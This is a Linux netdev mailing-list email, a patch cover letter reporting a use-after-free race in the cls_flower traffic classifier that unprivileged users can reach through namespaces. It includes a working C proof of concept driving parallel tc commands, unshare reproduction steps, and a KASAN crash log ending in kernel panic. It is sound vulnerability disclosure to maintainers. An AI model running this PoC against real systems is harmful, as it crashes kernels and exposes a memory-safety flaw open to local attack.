Received: from azure-sdnproxy.icoremail.net (azure-sdnproxy.icoremail.net [13.76.78.106])
	by smtp.subspace.kernel.org (Postfix) with ESMTP id CC42B280CE5
	for <netdev@vger.kernel.org>; Mon, 12 Oct 2026 01:07:41 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=13.76.78.106
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1791767266; cv=none; b=Fb6ytEZmDvFwIrB8BITcwRD428L9D7o0F7zu2VFepmDunrmzERaly5wOoCtPtcg5PDonIbTlVE8tLGkYgBRFwCke5WjB/dtkCy7hGAj/pEMCd9QjTzvRY5rkf/uISnc7nI3ZMB4oeFBVNG8pqFbuC2wli6lE8KTIBlwCE30sHok=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1791767266; c=relaxed/simple;
	bh=NmpeC28Le7LnXQrOHasN00y8k2pfXB+n4zncxPHdU/4=;
	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=kbUJPORu2pEQVbfgjZ3XwIipdAqnSKZ3T8gmAf3id47/c6AIUo9hNPuTvoPMp5KaS9hz7H+d6MVULBHCcZNM42dMT2FhcN1POCfAz2/oCo52b89Ty1K+jSBu06Jr/Xm9f/4RPQpJNPwvJ+nuVpt6S1c0q8bGJcqLSLx/0LG+6pM=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=none (p=none dis=none) header.from=lzu.edu.cn; spf=pass smtp.mailfrom=lzu.edu.cn; arc=none smtp.client-ip=13.76.78.106
Authentication-Results: smtp.subspace.kernel.org; dmarc=none (p=none dis=none) header.from=lzu.edu.cn
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=lzu.edu.cn
Received: from enjou-Legion-Y7000P-2019 (unknown [219.141.235.82])
	by app1 (Coremail) with SMTP id ygmowACXs73IMsxqh4xaAg--.62157S2;
	Mon, 12 Oct 2026 09:07:21 +0800 (CST)
From: Ren Wei <n05ec@lzu.edu.cn>
To: netdev@vger.kernel.org,
	kuba@kernel.org,
	pabeni@redhat.com
Cc: jhs@mojatatu.com,
	jiri@resnulli.us,
	davem@davemloft.net,
	edumazet@kernel.org,
	horms@kernel.org,
	vladbu@mellanox.com,
	sbrivio@redhat.com,
	bird@lzu.edu.cn,
	kanolyc@gmail.com,
	z1652074432@gmail.com,
	n05ec@lzu.edu.cn
Subject: [PATCH net v3 0/1] net/sched: cls_flower: avoid stale mask references after delete
Date: Mon, 12 Oct 2026 09:07:18 +0800
Message-ID: <20261012010720.2248662-1-n05ec@lzu.edu.cn>
X-Mailer: git-send-email 2.53.0
Precedence: bulk
X-Mailing-List: netdev@vger.kernel.org
List-Id: <netdev.vger.kernel.org>
List-Subscribe: <mailto:netdev+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:netdev+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit
X-CM-TRANSID:ygmowACXs73IMsxqh4xaAg--.62157S2
X-Coremail-Antispam: 1UD129KBjvAXoWfWrW3XF4kKrW8Wr15ur45Wrg_yoW8tFW3Wo
	ZFvF13CF40kr1ftryxAF13Kr4Uu340qa1xKrWrCa13G3WDJw1rXr17Ja48t34jvr45tayY
	yF17tr1xJa4UZw1kn29KB7ZKAUJUUUU8529EdanIXcx71UUUUU7v73VFW2AGmfu7bjvjm3
	AaLaJ3UjIYCTnIWjp_UUUYX7CY07I20VC2zVCF04k26cxKx2IYs7xG6rWj6s0DM7CIcVAF
	z4kK6r1j6r18M28lY4IEw2IIxxk0rwA2F7IY1VAKz4vEj48ve4kI8wA2z4x0Y4vE2Ix0cI
	8IcVAFwI0_tr0E3s1l84ACjcxK6xIIjxv20xvEc7CjxVAFwI0_GcCE3s1l84ACjcxK6I8E
	87Iv67AKxVW0oVCq3wA2z4x0Y4vEx4A2jsIEc7CjxVAFwI0_GcCE3s1le2I262IYc4CY6c
	8Ij28IcVAaY2xG8wAqx4xG64xvF2IEw4CE5I8CrVC2j2WlYx0E2Ix0cI8IcVAFwI0_Jr0_
	Jr4lYx0Ex4A2jsIE14v26r1j6r4UMcvjeVCFs4IE7xkEbVWUJVW8JwACjcxG0xvY0x0EwI
	xGrwACjI8F5VA0II8E6IAqYI8I648v4I1lFIxGxcIEc7CjxVA2Y2ka0xkIwI1lc7CjxVAa
	w2AFwI0_Jw0_GFylc2xSY4AK67AK6w4l42xK82IYc2Ij64vIr41l42xK82IY6x8ErcxFaV
	Av8VW8WwCFx2IqxVCFs4IE7xkEbVWUJVW8JwC20s026c02F40E14v26r1j6r18MI8I3I0E
	7480Y4vE14v26r106r1rMI8E67AF67kF1VAFwI0_Jw0_GFylIxkGc2Ij64vIr41lIxAIcV
	C0I7IYx2IY67AKxVWUJVWUCwCI42IY6xIIjxv20xvEc7CjxVAFwI0_Gr0_Cr1lIxAIcVCF
	04k26cxKx2IYs7xG6r1j6r1xMIIF0xvEx4A2jsIE14v26r1j6r4UMIIF0xvEx4A2jsIEc7
	CjxVAFwI0_Gr0_Gr1UYxBIdaVFxhVjvjDU0xZFpf9x0JUH6wZUUUUU=
X-CM-SenderInfo: zqqvvuo6o23hxhgxhubq/1tbiAQ0NCWqRfKEDjwBEsm

From: Yuhang Zheng <z1652074432@gmail.com>

Hi Linux kernel maintainers,

We found and validated an issue in net/sched/cls_flower.c. The bug is
reachable by an unprivileged user in a user and network namespace.

We will provide detailed information about the bug
in this email, along with a PoC to trigger it.

---- details below ----

Bug details:

cls_flower manages cls_fl_filter lifetime and mask lifetime separately.

In these code paths:
- __fl_delete() removes the filter from classifier structures and then
  calls fl_mask_put(head, f->mask) before __fl_put(f).
- The replace path in fl_change() similarly calls
  fl_mask_put(head, fold->mask) before the old filter is fully released.

At the same time, concurrent readers can still hold a live filter
reference from fl_get()/walk/reoffload/get-dump paths and later access
f->mask in fl_dump() / fl_reoffload().

As a result, a reader may dereference f->mask after the mask object has
already been released, leading to a slab use-after-free in fl_dump_key().

Reproducer:

    gcc -O2 -o poc poc.c
    unshare -Urn bash -lc "PATH=$PATH:/sbin:/usr/sbin ./poc"

We run the PoC in a 2 vCPU, 2 GB RAM x86 QEMU environment.

------BEGIN poc.c------

#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/wait.h>
#include <unistd.h>

static pid_t p[16];
static const int w[] = {0,0,1,1,2,2,2,2,2,2,2,2,3,3,3,3};
static const char *c[] = {
        "filter replace dev lo ingress protocol ip pref 1 handle 1 flower ip_proto tcp src_ip 1.1.1.1 dst_ip 2.2.2.2 src_port 1000 dst_port 2000 action drop\n"
        "filter replace dev lo ingress protocol ip pref 1 handle 1 flower ip_proto tcp src_ip 1.1.1.1 dst_ip 2.2.2.2 action drop\n"
        "filter replace dev lo ingress protocol ip pref 1 handle 1 flower ip_proto udp src_ip 3.3.3.3 dst_ip 4.4.4.4 src_port 1001 dst_port 2001 action drop\n",
        "filter del dev lo ingress pref 1 handle 1 flower\n"
        "filter add dev lo ingress protocol ip pref 1 handle 1 flower ip_proto tcp src_ip 1.1.1.1 dst_ip 2.2.2.2 src_port 1000 dst_port 2000 action drop\n",
        "filter get dev lo ingress protocol ip pref 1 handle 1 flower\n",
        "-s filter show dev lo ingress\n",
};

static void x(void)
{
        for (int i = 0; i < 16; i++)
                if (p[i] > 0)
                        kill(p[i], SIGKILL);
        while (waitpid(-1, 0, WNOHANG) > 0)
                ;
        system("tc qdisc del dev lo clsact >/dev/null 2>&1");
}

static void s(int n)
{
        FILE *f = popen("tc -force -batch - >/dev/null 2>&1", "w");

        if (!f) {
                perror("popen");
                x();
                exit(1);
        }
        setvbuf(f, 0, _IOLBF, 0);
        for (;;)
                fputs(c[n], f);
}

static void h(int n)
{
        (void)n;
        x();
        _exit(0);
}

int main(void)
{
        signal(SIGINT, h);
        signal(SIGTERM, h);
        system("tc qdisc del dev lo clsact >/dev/null 2>&1");
        if (system("tc qdisc add dev lo clsact")) {
                fputs("failed to create clsact on lo\n", stderr);
                return 1;
        }
        system("tc filter replace dev lo ingress protocol ip pref 1 handle 1 flower ip_proto tcp src_ip 1.1.1.1 dst_ip 2.2.2.2 src_port 1000 dst_port 2000 action drop >/dev/null 2>&1");
        for (int i = 0; i < 16; i++)
                if ((p[i] = fork()) < 0) {
                        perror("fork");
                        x();
                        return 1;
                } else if (!p[i])
                        s(w[i]);
        for (;;)
                pause();
}

------END poc.c--------

----BEGIN crash log----

[  286.911107][ T9825] ==================================================================
[  286.918030][ T9825] BUG: KASAN: slab-use-after-free in fl_dump_key+0x255b/0x2820
[  286.925270][ T9825] Read of size 4 at addr ffff888023a1b800 by task tc/9825
[  286.931824][ T9825]
[  286.933998][ T9825] CPU: 1 UID: 1001 PID: 9825 Comm: tc Not tainted 6.18.0-rc7 #2 PREEMPT(full)
[  286.934047][ T9825] Hardware name: QEMU Ubuntu 24.04 PC v2 (i440FX + PIIX, arch_caps fix, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
[  286.934075][ T9825] Call Trace:
[  286.934129][ T9825]  <TASK>
[  286.934143][ T9825]  dump_stack_lvl+0x10e/0x1f0
[  286.934291][ T9825]  print_report+0xd0/0x630
[  286.934384][ T9825]  ? fl_dump_key+0x255b/0x2820
[  286.934434][ T9825]  ? srso_alias_return_thunk+0x5/0xfbef5
[  286.934503][ T9825]  ? srso_alias_return_thunk+0x5/0xfbef5
[  286.934543][ T9825]  ? __phys_addr+0xe8/0x180
[  286.934597][ T9825]  ? fl_dump_key+0x255b/0x2820
[  286.934645][ T9825]  kasan_report+0xe4/0x120
[  286.934684][ T9825]  ? fl_dump_key+0x255b/0x2820
[  286.934739][ T9825]  fl_dump_key+0x255b/0x2820
[  286.934794][ T9825]  ? srso_alias_return_thunk+0x5/0xfbef5
[  286.934835][ T9825]  ? __pfx_fl_dump_key+0x10/0x10
[  286.934883][ T9825]  ? do_raw_spin_lock+0x128/0x270
[  286.934938][ T9825]  ? __pfx_do_raw_spin_lock+0x10/0x10
[  286.934976][ T9825]  ? srso_alias_return_thunk+0x5/0xfbef5
[  286.935017][ T9825]  ? lock_acquire+0x30/0x80
[  286.935046][ T9825]  ? fl_dump+0x19d/0x680
[  286.935097][ T9825]  fl_dump+0x258/0x680
[  286.935145][ T9825]  ? __entry_text_end+0x1020b5/0x1020b9
[  286.935187][ T9825]  ? __pfx_fl_dump+0x10/0x10
[  286.935236][ T9825]  ? srso_alias_return_thunk+0x5/0xfbef5
[  286.935275][ T9825]  ? __asan_memcpy+0x3c/0x60
[  286.935326][ T9825]  ? srso_alias_return_thunk+0x5/0xfbef5
[  286.935367][ T9825]  ? __pfx_fl_dump+0x10/0x10
[  286.935416][ T9825]  tcf_fill_node+0x6ab/0xa70
[  286.935469][ T9825]  ? __pfx_tcf_fill_node+0x10/0x10
[  286.935501][ T9825]  ? __pfx___alloc_skb+0x10/0x10
[  286.935571][ T9825]  ? srso_alias_return_thunk+0x5/0xfbef5
[  286.935611][ T9825]  ? rcu_is_watching+0x12/0xc0
[  286.935659][ T9825]  tfilter_notify_prep+0x13f/0x200
[  286.935702][ T9825]  tfilter_notify+0xdb/0x2d0
[  286.935739][ T9825]  ? __pfx_fl_get+0x10/0x10
[  286.935786][ T9825]  tc_get_tfilter+0x767/0xe60
[  286.935907][ T9825]  ? __pfx_tc_get_tfilter+0x10/0x10
[  286.935950][ T9825]  ? srso_alias_return_thunk+0x5/0xfbef5
[  286.935989][ T9825]  ? __lock_acquire+0x639/0x1b50
[  286.936028][ T9825]  ? srso_alias_return_thunk+0x5/0xfbef5
[  286.936077][ T9825]  ? srso_alias_return_thunk+0x5/0xfbef5
[  286.936127][ T9825]  ? find_held_lock+0x2b/0x80
[  286.936183][ T9825]  ? __pfx_tc_get_tfilter+0x10/0x10
[  286.936229][ T9825]  ? srso_alias_return_thunk+0x5/0xfbef5
[  286.936272][ T9825]  ? __pfx_tc_get_tfilter+0x10/0x10
[  286.936312][ T9825]  rtnetlink_rcv_msg+0x95e/0xe90
[  286.936380][ T9825]  ? __pfx_rtnetlink_rcv_msg+0x10/0x10
[  286.936421][ T9825]  ? srso_alias_return_thunk+0x5/0xfbef5
[  286.936461][ T9825]  ? __lock_acquire+0x639/0x1b50
[  286.936496][ T9825]  netlink_rcv_skb+0x158/0x420
[  286.936534][ T9825]  ? __pfx_rtnetlink_rcv_msg+0x10/0x10
[  286.936572][ T9825]  ? __pfx_netlink_rcv_skb+0x10/0x10
[  286.936618][ T9825]  ? srso_alias_return_thunk+0x5/0xfbef5
[  286.936657][ T9825]  ? netlink_deliver_tap+0x1ae/0xd40
[  286.936696][ T9825]  netlink_unicast+0x5a1/0x870
[  286.936736][ T9825]  ? __pfx_netlink_unicast+0x10/0x10
[  286.936782][ T9825]  netlink_sendmsg+0x8b0/0xdb0
[  286.936823][ T9825]  ? __pfx_netlink_sendmsg+0x10/0x10
[  286.936859][ T9825]  ? __import_iovec+0x1d2/0x640
[  286.936994][ T9825]  ____sys_sendmsg+0xaa4/0xc80
[  286.937096][ T9825]  ? copy_msghdr_from_user+0x10a/0x160
[  286.937132][ T9825]  ? __pfx_____sys_sendmsg+0x10/0x10
[  286.937181][ T9825]  ? srso_alias_return_thunk+0x5/0xfbef5
[  286.937254][ T9825]  ? __sanitizer_cov_trace_switch+0x54/0x90
[  286.937303][ T9825]  ___sys_sendmsg+0x134/0x1d0
[  286.937336][ T9825]  ? __pfx____sys_sendmsg+0x10/0x10
[  286.937369][ T9825]  ? __pfx___fsnotify_parent+0x10/0x10
[  286.937423][ T9825]  ? __pfx_vfs_write+0x10/0x10
[  286.937454][ T9825]  ? srso_alias_return_thunk+0x5/0xfbef5
[  286.937493][ T9825]  ? __do_sys_brk+0x440/0xa80
[  286.937532][ T9825]  __sys_sendmsg+0x16d/0x220
[  286.937564][ T9825]  ? __pfx___sys_sendmsg+0x10/0x10
[  286.937605][ T9825]  ? do_user_addr_fault+0x7fe/0x12f0
[  286.937650][ T9825]  do_syscall_64+0xc9/0xfa0
[  286.937685][ T9825]  entry_SYSCALL_64_after_hwframe+0x77/0x7f
[  286.937718][ T9825] RIP: 0033:0x7fdb59191fa3
[  286.937745][ T9825] Code: 64 89 02 48 c7 c0 ff ff ff ff eb b7 66 2e 0f 1f 84 00 00 00 00 00 90 64 8b 04 25 18 00 00 00 85 c0 75 14 b8 2e 00 00 00 0f 05 <48> 3d 00 f0 ff ff 77 55 c3 0f 1f 40 00 48 83 ec 28 89 54 24 1c 48
[  286.937777][ T9825] RSP: 002b:00007ffc6ad55f38 EFLAGS: 00000246 ORIG_RAX: 000000000000002e
[  286.937864][ T9825] RAX: ffffffffffffffda RBX: 00007ffc6ad56088 RCX: 00007fdb59191fa3
[  286.937890][ T9825] RDX: 0000000000000000 RSI: 00007ffc6ad55fa0 RDI: 0000000000000003
[  286.937915][ T9825] RBP: 0000000069b54e61 R08: 0000000000000001 R09: 00007ffc6ad55eec
[  286.937940][ T9825] R10: 00007fdb59211ac0 R11: 0000000000000246 R12: 0000000000000001
[  286.937964][ T9825] R13: 00007ffc6ad5a1a0 R14: 00007ffc6ad56090 R15: 0000562d6005ef40
[  286.938015][ T9825]  </TASK>
[  286.938029][ T9825]
[  287.359263][ T9825] Allocated by task 9807:
[  287.363007][ T9825]  kasan_save_stack+0x33/0x60
[  287.367643][ T9825]  kasan_save_track+0x14/0x30
[  287.371562][ T9825]  __kasan_kmalloc+0xaa/0xb0
[  287.375955][ T9825]  fl_check_assign_mask+0x20de/0x43e0
[  287.381514][ T9825]  fl_change+0x170e/0x7910
[  287.385757][ T9825]  tc_new_tfilter+0xa40/0x2340
[  287.390212][ T9825]  rtnetlink_rcv_msg+0x95e/0xe90
[  287.395013][ T9825]  netlink_rcv_skb+0x158/0x420
[  287.399491][ T9825]  netlink_unicast+0x5a1/0x870
[  287.403497][ T9825]  netlink_sendmsg+0x8b0/0xdb0
[  287.407823][ T9825]  ____sys_sendmsg+0xaa4/0xc80
[  287.411901][ T9825]  ___sys_sendmsg+0x134/0x1d0
[  287.415943][ T9825]  __sys_sendmsg+0x16d/0x220
[  287.420000][ T9825]  do_syscall_64+0xc9/0xfa0
[  287.424597][ T9825]  entry_SYSCALL_64_after_hwframe+0x77/0x7f
[  287.430007][ T9825]
[  287.432293][ T9825] Freed by task 12:
[  287.435895][ T9825]  kasan_save_stack+0x33/0x60
[  287.440205][ T9825]  kasan_save_track+0x14/0x30
[  287.444307][ T9825]  __kasan_save_free_info+0x3b/0x60
[  287.448935][ T9825]  __kasan_slab_free+0x5f/0x80
[  287.452988][ T9825]  kfree+0x29b/0x720
[  287.456648][ T9825]  process_one_work+0x9b9/0x1b50
[  287.460981][ T9825]  worker_thread+0x630/0xe60
[  287.465276][ T9825]  kthread+0x3a8/0x770
[  287.468811][ T9825]  ret_from_fork+0x689/0x7c0
[  287.472816][ T9825]  ret_from_fork_asm+0x1a/0x30
[  287.477081][ T9825]
[  287.479144][ T9825] Last potentially related work creation:
[  287.484510][ T9825]  kasan_save_stack+0x33/0x60
[  287.488566][ T9825]  kasan_record_aux_stack+0xa7/0xc0
[  287.496171][ T9825]  insert_work+0x36/0x230
[  287.501491][ T9825]  __queue_work+0x999/0x1180
[  287.505629][ T9825]  rcu_work_rcufn+0x5c/0x90
[  287.509699][ T9825]  rcu_core+0x7b0/0x1500
[  287.513815][ T9825]  handle_softirqs+0x1ea/0x8a0
[  287.518158][ T9825]  __irq_exit_rcu+0xfe/0x160
[  287.521850][ T9825]  irq_exit_rcu+0x9/0x30
[  287.526482][ T9825]  sysvec_apic_timer_interrupt+0xa3/0xc0
[  287.532122][ T9825]  asm_sysvec_apic_timer_interrupt+0x1a/0x20
[  287.537574][ T9825]
[  287.539821][ T9825] Second to last potentially related work creation:
[  287.545698][ T9825]  kasan_save_stack+0x33/0x60
[  287.550230][ T9825]  kasan_record_aux_stack+0xa7/0xc0
[  287.555110][ T9825]  __call_rcu_common.constprop.0+0xa5/0xa00
[  287.560573][ T9825]  queue_rcu_work+0xa0/0xd0
[  287.564569][ T9825]  fl_mask_put+0xa21/0x1210
[  287.569180][ T9825]  __fl_delete+0xa61/0x15f0
[  287.573230][ T9825]  fl_delete+0xa8/0x170
[  287.576995][ T9825]  tc_del_tfilter+0x10d9/0x1570
[  287.581684][ T9825]  rtnetlink_rcv_msg+0x95e/0xe90
[  287.586337][ T9825]  netlink_rcv_skb+0x158/0x420
[  287.590767][ T9825]  netlink_unicast+0x5a1/0x870
[  287.594882][ T9825]  netlink_sendmsg+0x8b0/0xdb0
[  287.599190][ T9825]  ____sys_sendmsg+0xaa4/0xc80
[  287.603266][ T9825]  ___sys_sendmsg+0x134/0x1d0
[  287.607438][ T9825]  __sys_sendmsg+0x16d/0x220
[  287.611342][ T9825]  do_syscall_64+0xc9/0xfa0
[  287.615304][ T9825]  entry_SYSCALL_64_after_hwframe+0x77/0x7f
[  287.620377][ T9825]
[  287.622385][ T9825] The buggy address belongs to the object at ffff888023a1b800
[  287.622385][ T9825]  which belongs to the cache kmalloc-2k of size 2048
[  287.634365][ T9825] The buggy address is located 0 bytes inside of
[  287.634365][ T9825]  freed 2048-byte region [ffff888023a1b800, ffff888023a1c000)
[  287.645820][ T9825]
[  287.648056][ T9825] The buggy address belongs to the physical page:
[  287.653267][ T9825] page: refcount:0 mapcount:0 mapping:0000000000000000 index:0x0 pfn:0x23a18
[  287.660504][ T9825] head: order:3 mapcount:0 entire_mapcount:0 nr_pages_mapped:0 pincount:0
[  287.668206][ T9825] flags: 0xfff00000000040(head|node=0|zone=1|lastcpupid=0x7ff)
[  287.674719][ T9825] page_type: f5(slab)
[  287.678286][ T9825] raw: 00fff00000000040 ffff88801b043540 ffffea00008ed610 ffffea0000dc9e10
[  287.685715][ T9825] raw: 0000000000000000 0000000000050005 00000000f5000000 0000000000000000
[  287.693982][ T9825] head: 00fff00000000040 ffff88801b043540 ffffea00008ed610 ffffea0000dc9e10
[  287.703247][ T9825] head: 0000000000000000 0000000000050005 00000000f5000000 0000000000000000
[  287.710873][ T9825] head: 00fff00000000003 ffffea00008e8601 00000000ffffffff 00000000ffffffff
[  287.718335][ T9825] head: ffffffffffffffff 0000000000000000 00000000ffffffff 0000000000000008
[  287.725487][ T9825] page dumped because: kasan: bad access detected
[  287.729223][ T9825] page_owner tracks the page as allocated
[  287.733478][ T9825] page last allocated via order 3, migratetype Unmovable, gfp_mask 0xd20c0(__GFP_IO|__GFP_FS|__GFP_NOWARN|__GFP_NORETRY|__GFP_COMP|__GFP_NOMEMALLOC), pid 9807, tgid 9807 (tc), ts 286808497376, free_ts 285745305957
[  287.750851][ T9825]  post_alloc_hook+0x1af/0x220
[  287.755041][ T9825]  get_page_from_freelist+0x7bc/0x3be0
[  287.759682][ T9825]  __alloc_frozen_pages_noprof+0x267/0x24a0
[  287.765304][ T9825]  alloc_pages_mpol+0x1fb/0x550
[  287.769568][ T9825]  new_slab+0x24a/0x360
[  287.773148][ T9825]  ___slab_alloc+0xe08/0x1b00
[  287.777193][ T9825]  __slab_alloc.isra.0+0x63/0x110
[  287.781733][ T9825]  __kmalloc_cache_noprof+0x4d9/0x790
[  287.786395][ T9825]  fl_change+0x176/0x7910
[  287.790153][ T9825]  tc_new_tfilter+0xa40/0x2340
[  287.794454][ T9825]  rtnetlink_rcv_msg+0x95e/0xe90
[  287.798857][ T9825]  netlink_rcv_skb+0x158/0x420
[  287.802896][ T9825]  netlink_unicast+0x5a1/0x870
[  287.807286][ T9825]  netlink_sendmsg+0x8b0/0xdb0
[  287.811215][ T9825]  ____sys_sendmsg+0xaa4/0xc80
[  287.815324][ T9825]  ___sys_sendmsg+0x134/0x1d0
[  287.819204][ T9825] page last free pid 9811 tgid 9811 stack trace:
[  287.825146][ T9825]  __free_frozen_pages+0x872/0x1260
[  287.829453][ T9825]  qlist_free_all+0x47/0x110
[  287.833790][ T9825]  kasan_quarantine_reduce+0x195/0x1e0
[  287.839093][ T9825]  __kasan_slab_alloc+0x69/0x90
[  287.843833][ T9825]  kmem_cache_alloc_noprof+0x24b/0x700
[  287.849100][ T9825]  vm_area_alloc+0x1f/0x160
[  287.853167][ T9825]  __mmap_region+0xf2f/0x27a0
[  287.857306][ T9825]  mmap_region+0x17c/0x400
[  287.861395][ T9825]  do_mmap+0xd02/0x1230
[  287.865072][ T9825]  vm_mmap_pgoff+0x29e/0x470
[  287.869189][ T9825]  vm_mmap+0x8e/0xc0
[  287.872455][ T9825]  elf_load+0x36e/0x760
[  287.876167][ T9825]  load_elf_binary+0x1473/0x51b0
[  287.880513][ T9825]  bprm_execve+0x8cc/0x1630
[  287.884517][ T9825]  do_execveat_common.isra.0+0x4a5/0x5f0
[  287.889338][ T9825]  __x64_sys_execve+0x8e/0xb0
[  287.892989][ T9825]
[  287.894963][ T9825] Memory state around the buggy address:
[  287.899491][ T9825]  ffff888023a1b700: fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc
[  287.905890][ T9825]  ffff888023a1b780: fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc
[  287.912676][ T9825] >ffff888023a1b800: fa fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb
[  287.919828][ T9825]                    ^
[  287.923946][ T9825]  ffff888023a1b880: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb
[  287.931412][ T9825]  ffff888023a1b900: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb
[  287.938252][ T9825] ==================================================================
[  287.947496][ T9825] Kernel panic - not syncing: KASAN: panic_on_warn set ...
[  287.954507][ T9825] CPU: 1 UID: 1001 PID: 9825 Comm: tc Not tainted 6.18.0-rc7 #2 PREEMPT(full)
[  287.962740][ T9825] Hardware name: QEMU Ubuntu 24.04 PC v2 (i440FX + PIIX, arch_caps fix, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
[  287.973532][ T9825] Call Trace:
[  287.976475][ T9825]  <TASK>
[  287.979067][ T9825]  dump_stack_lvl+0x3b/0x1f0
[  287.983373][ T9825]  vpanic+0x658/0x710
[  287.987061][ T9825]  ? fl_dump_key+0x255b/0x2820
[  287.991437][ T9825]  panic+0xca/0xd0
[  287.995314][ T9825]  ? __pfx_panic+0x10/0x10
[  287.999383][ T9825]  ? check_panic_on_warn+0x1f/0xb0
[  288.003772][ T9825]  check_panic_on_warn+0xab/0xb0
[  288.008457][ T9825]  end_report+0x10b/0x170
[  288.012552][ T9825]  kasan_report+0xf4/0x120
[  288.016771][ T9825]  ? fl_dump_key+0x255b/0x2820
[  288.021110][ T9825]  fl_dump_key+0x255b/0x2820
[  288.025374][ T9825]  ? srso_alias_return_thunk+0x5/0xfbef5
[  288.031083][ T9825]  ? __pfx_fl_dump_key+0x10/0x10
[  288.035550][ T9825]  ? do_raw_spin_lock+0x128/0x270
[  288.040018][ T9825]  ? __pfx_do_raw_spin_lock+0x10/0x10
[  288.045162][ T9825]  ? srso_alias_return_thunk+0x5/0xfbef5
[  288.050283][ T9825]  ? lock_acquire+0x30/0x80
[  288.054072][ T9825]  ? fl_dump+0x19d/0x680
[  288.058547][ T9825]  fl_dump+0x258/0x680
[  288.062188][ T9825]  ? __entry_text_end+0x1020b5/0x1020b9
[  288.067356][ T9825]  ? __pfx_fl_dump+0x10/0x10
[  288.071184][ T9825]  ? srso_alias_return_thunk+0x5/0xfbef5
[  288.076265][ T9825]  ? __asan_memcpy+0x3c/0x60
[  288.080239][ T9825]  ? srso_alias_return_thunk+0x5/0xfbef5
[  288.084752][ T9825]  ? __pfx_fl_dump+0x10/0x10
[  288.089069][ T9825]  tcf_fill_node+0x6ab/0xa70
[  288.093124][ T9825]  ? __pfx_tcf_fill_node+0x10/0x10
[  288.097215][ T9825]  ? __pfx___alloc_skb+0x10/0x10
[  288.101942][ T9825]  ? srso_alias_return_thunk+0x5/0xfbef5
[  288.106872][ T9825]  ? rcu_is_watching+0x12/0xc0
[  288.110748][ T9825]  tfilter_notify_prep+0x13f/0x200
[  288.115393][ T9825]  tfilter_notify+0xdb/0x2d0
[  288.119057][ T9825]  ? __pfx_fl_get+0x10/0x10
[  288.123020][ T9825]  tc_get_tfilter+0x767/0xe60
[  288.126884][ T9825]  ? __pfx_tc_get_tfilter+0x10/0x10
[  288.143619][ T9825]  ? srso_alias_return_thunk+0x5/0xfbef5
[  288.148763][ T9825]  ? __lock_acquire+0x639/0x1b50
[  288.152766][ T9825]  ? srso_alias_return_thunk+0x5/0xfbef5
[  288.157649][ T9825]  ? srso_alias_return_thunk+0x5/0xfbef5
[  288.162497][ T9825]  ? find_held_lock+0x2b/0x80
[  288.166765][ T9825]  ? __pfx_tc_get_tfilter+0x10/0x10
[  288.171029][ T9825]  ? srso_alias_return_thunk+0x5/0xfbef5
[  288.176176][ T9825]  ? __pfx_tc_get_tfilter+0x10/0x10
[  288.180585][ T9825]  rtnetlink_rcv_msg+0x95e/0xe90
[  288.185219][ T9825]  ? __pfx_rtnetlink_rcv_msg+0x10/0x10
[  288.190409][ T9825]  ? srso_alias_return_thunk+0x5/0xfbef5
[  288.194991][ T9825]  ? __lock_acquire+0x639/0x1b50
[  288.199423][ T9825]  netlink_rcv_skb+0x158/0x420
[  288.203474][ T9825]  ? __pfx_rtnetlink_rcv_msg+0x10/0x10
[  288.207992][ T9825]  ? __pfx_netlink_rcv_skb+0x10/0x10
[  288.212266][ T9825]  ? srso_alias_return_thunk+0x5/0xfbef5
[  288.216938][ T9825]  ? netlink_deliver_tap+0x1ae/0xd40
[  288.221323][ T9825]  netlink_unicast+0x5a1/0x870
[  288.225481][ T9825]  ? __pfx_netlink_unicast+0x10/0x10
[  288.229761][ T9825]  netlink_sendmsg+0x8b0/0xdb0
[  288.234145][ T9825]  ? __pfx_netlink_sendmsg+0x10/0x10
[  288.238487][ T9825]  ? __import_iovec+0x1d2/0x640
[  288.242576][ T9825]  ____sys_sendmsg+0xaa4/0xc80
[  288.246552][ T9825]  ? copy_msghdr_from_user+0x10a/0x160
[  288.250999][ T9825]  ? __pfx_____sys_sendmsg+0x10/0x10
[  288.255380][ T9825]  ? srso_alias_return_thunk+0x5/0xfbef5
[  288.260219][ T9825]  ? __sanitizer_cov_trace_switch+0x54/0x90
[  288.265406][ T9825]  ___sys_sendmsg+0x134/0x1d0
[  288.269306][ T9825]  ? __pfx____sys_sendmsg+0x10/0x10
[  288.274586][ T9825]  ? __pfx___fsnotify_parent+0x10/0x10
[  288.278997][ T9825]  ? __pfx_vfs_write+0x10/0x10
[  288.283138][ T9825]  ? srso_alias_return_thunk+0x5/0xfbef5
[  288.287662][ T9825]  ? __do_sys_brk+0x440/0xa80
[  288.292010][ T9825]  __sys_sendmsg+0x16d/0x220
[  288.295648][ T9825]  ? __pfx___sys_sendmsg+0x10/0x10
[  288.300440][ T9825]  ? do_user_addr_fault+0x7fe/0x12f0
[  288.304804][ T9825]  do_syscall_64+0xc9/0xfa0
[  288.308769][ T9825]  entry_SYSCALL_64_after_hwframe+0x77/0x7f
[  288.313869][ T9825] RIP: 0033:0x7fdb59191fa3
[  288.317576][ T9825] Code: 64 89 02 48 c7 c0 ff ff ff ff eb b7 66 2e 0f 1f 84 00 00 00 00 00 90 64 8b 04 25 18 00 00 00 85 c0 75 14 b8 2e 00 00 00 0f 05 <48> 3d 00 f0 ff ff 77 55 c3 0f 1f 40 00 48 83 ec 28 89 54 24 1c 48
[  288.333310][ T9825] RSP: 002b:00007ffc6ad55f38 EFLAGS: 00000246 ORIG_RAX: 000000000000002e
[  288.340191][ T9825] RAX: ffffffffffffffda RBX: 00007ffc6ad56088 RCX: 00007fdb59191fa3
